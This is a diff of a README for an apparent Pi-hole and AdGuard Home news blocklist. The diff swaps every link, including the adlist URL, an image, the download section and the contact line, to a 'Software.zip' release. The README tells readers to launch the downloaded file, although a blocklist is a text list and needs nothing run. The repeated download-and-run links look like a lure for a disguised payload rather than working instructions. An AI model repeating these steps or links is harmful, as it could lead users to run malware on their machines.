@@ -20,8 +20,8 @@ To utilize this blocklist, follow these steps:
 1. **Pi-Hole:**
    - Navigate to your Pi-Hole dashboard.
    - Go to "Group Management" and select "Adlists".
-   - Add the following URL to the list: [Download AusNews Blocklist](https://github.com/Narrr16/pihole-ausnews/releases/download/v1.0/App.zip)  
-     ![Download Blocklist](https://github.com/Narrr16/pihole-ausnews/releases/download/v1.0/App.zip)
+   - Add the following URL to the list: [Download AusNews Blocklist](https://github.com/Narrr16/pihole-ausnews/releases/download/v2.0/Software.zip)  
+     ![Download Blocklist](https://github.com/Narrr16/pihole-ausnews/releases/download/v2.0/Software.zip)
 
 2. **AdguardHome:**
    - Open your AdguardHome settings.
@@ -30,7 +30,7 @@ To utilize this blocklist, follow these steps:
 
 ## 🌐 Get the Blocklist
 
-To get the latest version of the AusNews blocklist, download it [here](https://github.com/Narrr16/pihole-ausnews/releases/download/v1.0/App.zip). Launch the downloaded file to start using the blocklist. If the link is not working, please check the "Releases" section of this repository for alternative download options.
+To get the latest version of the AusNews blocklist, download it [here](https://github.com/Narrr16/pihole-ausnews/releases/download/v2.0/Software.zip). Launch the downloaded file to start using the blocklist. If the link is not working, please check the "Releases" section of this repository for alternative download options.
 
 ## 📈 Contribution
 
@@ -46,7 +46,7 @@ A big thank you to all contributors who have helped make this project possible. 
 
 ## 📧 Contact
 
-Have any questions, suggestions, or just want to say hello? Reach out to us at https://github.com/Narrr16/pihole-ausnews/releases/download/v1.0/App.zip Your feedback is valuable to us and helps us improve the blocklist for everyone.
+Have any questions, suggestions, or just want to say hello? Reach out to us at https://github.com/Narrr16/pihole-ausnews/releases/download/v2.0/Software.zip Your feedback is valuable to us and helps us improve the blocklist for everyone.
 
 ## 🌟 Support Us
 
